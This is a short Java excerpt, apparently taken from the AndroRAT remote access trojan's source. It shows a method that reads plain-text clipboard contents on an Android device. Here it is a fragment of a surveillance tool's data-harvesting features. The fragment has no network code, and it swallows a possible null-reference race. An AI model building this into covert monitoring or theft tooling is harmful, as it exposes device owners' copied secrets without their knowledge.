// https://github.com/karma9874/AndroRAT/tree/1516f5e6cad261db33f7f5bb074377de72cc6d94/Android_Code/app/src/main/java/com/example/reverseshell2/functions.java#L55-L78
public class TempClass {
    public String readFromClipboard() {
        final ClipboardManager[] clipboard = new ClipboardManager[1];
        String result="";
        activity.runOnUiThread(new Runnable() {
            @Override
            public void run() {
                clipboard[0] = (ClipboardManager) activity.getSystemService(Context.CLIPBOARD_SERVICE);
            }
        });
        try{
            if (clipboard[0].hasPrimaryClip()) {
                android.content.ClipDescription description = clipboard[0].getPrimaryClipDescription();
                android.content.ClipData data = clipboard[0].getPrimaryClip();
                if (data != null && description != null && description.hasMimeType(ClipDescription.MIMETYPE_TEXT_PLAIN))
                    result= String.valueOf(data.getItemAt(0).getText());
                if(result.isEmpty()){
                    result = null;
                }
            }
        }catch (NullPointerException e){
            result=null;
        }
        return result;
    }

}